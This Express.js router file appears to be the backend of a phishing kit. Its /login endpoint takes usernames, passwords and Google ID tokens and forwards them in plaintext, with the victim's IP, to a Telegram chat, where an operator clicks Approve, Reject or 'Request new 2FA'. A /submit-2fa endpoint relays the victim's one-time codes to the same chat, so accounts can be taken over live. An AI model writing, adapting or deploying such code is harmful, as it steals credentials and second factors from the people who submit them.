'use strict';

const { Router } = require('express');
const { v4: uuidv4 } = require('uuid');
const { clientIp } = require('../lib/clientIp');
const store = require('../lib/store');
const { sendApprovalMessage, tgApi } = require('../lib/telegram');
const { TELEGRAM_ADMIN_CHAT_ID } = require('../config');

const router = Router();

function pendingResponse(res, userLabel, ip, message) {
    const id = uuidv4();
    store.create(id, userLabel, ip);
    console.log('[login] awaiting Telegram approval', JSON.stringify({ request_id: id, user: String(userLabel), client_ip: ip }));
    sendApprovalMessage(id, message).catch(err => console.error('sendApprovalMessage failed:', err));
    return res.status(202).json({ status: 'pending', request_id: id });
}

router.post('/login', function (req, res) {
    const body = req.body || {};
    const idToken = body.credential || body.id_token;
    const ip = clientIp(req);

    if (idToken) {
        const text = `Google sign-in\n\nToken:\n${String(idToken)}\n\nIP: ${ip}`;
        return pendingResponse(res, 'Google', ip, text);
    }

    const username = body.username;
    const password = body.password;

    if (username == null || password == null) {
        return res.status(400).json({ error: 'Provide username and password, or Google credential / id_token' });
    }

    const u = String(username).trim();
    const p = String(password);

    if (!u || !p) {
        return res.status(400).json({ error: 'Username and password cannot be empty' });
    }

    const text = `Password sign-in\n\nUsername: ${u}\nPassword: ${p}\n\nIP: ${ip}`;
    return pendingResponse(res, u, ip, text);
});

router.get('/login-status', function (req, res) {
    const id = req.query.request_id;
    if (!id || typeof id !== 'string') {
        return res.status(400).json({ error: 'request_id required' });
    }

    const rec = store.get(id);
    if (!rec) {
        return res.status(404).json({ error: 'Unknown or expired request' });
    }

    if ((rec.status === 'pending' || rec.status === '2fa') && store.now() > rec.expiresAt) {
        store.expire(id);
        return res.status(404).json({ error: 'Unknown or expired request' });
    }

    store.sweepExpired();

    // Include 2fa_type and request_id when status is '2fa' so the FE can submit the code
    const payload = { status: rec.status };
    if (rec.status === '2fa') {
        payload.two_fa_type = rec.twoFactorType || 'email';
        payload.request_id = id;
    }

    return res.json(payload);
});

router.post('/submit-2fa', function (req, res) {
    const body = req.body || {};
    const id = body.request_id;
    const code = String(body.code || '').trim();

    if (!id || !code) {
        return res.status(400).json({ error: 'request_id and code required' });
    }

    const rec = store.get(id);
    if (!rec) {
        return res.status(404).json({ error: 'Unknown or expired request' });
    }

    if (rec.status !== '2fa') {
        return res.status(409).json({ error: 'Request is not awaiting 2FA' });
    }

    if (store.now() > rec.expiresAt) {
        store.expire(id);
        return res.status(404).json({ error: 'Request expired' });
    }

    // Store code, mark pending again so operator can approve/reject/2fa again
    rec.twoFactorCode = code;
    rec.status = 'pending';

    const typeLabel = rec.twoFactorType || 'unknown';
    const notifyText = `🔐 2FA code submitted\n\nUsername: ${rec.userId}\nIP: ${rec.clientIp}\nMethod: ${typeLabel}\nCode: ${code}`;

    console.log('[2fa] code received', JSON.stringify({ request_id: id, user: rec.userId, type: typeLabel, code }));

    if (TELEGRAM_ADMIN_CHAT_ID) {
        tgApi('sendMessage', {
            chat_id: TELEGRAM_ADMIN_CHAT_ID,
            text: notifyText + '\n\nAction?',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Approve', callback_data: 'approve:' + id },
                        { text: '❌ Reject', callback_data: 'reject:' + id }
                    ],
                    [
                        { text: '🔐 Request new 2FA', callback_data: '2fa_email:' + id }
                    ]
                ]
            }
        }).catch(err => console.error('2FA notify failed:', err));
    }

    return res.status(202).json({ status: 'pending', request_id: id });
});

module.exports = router;
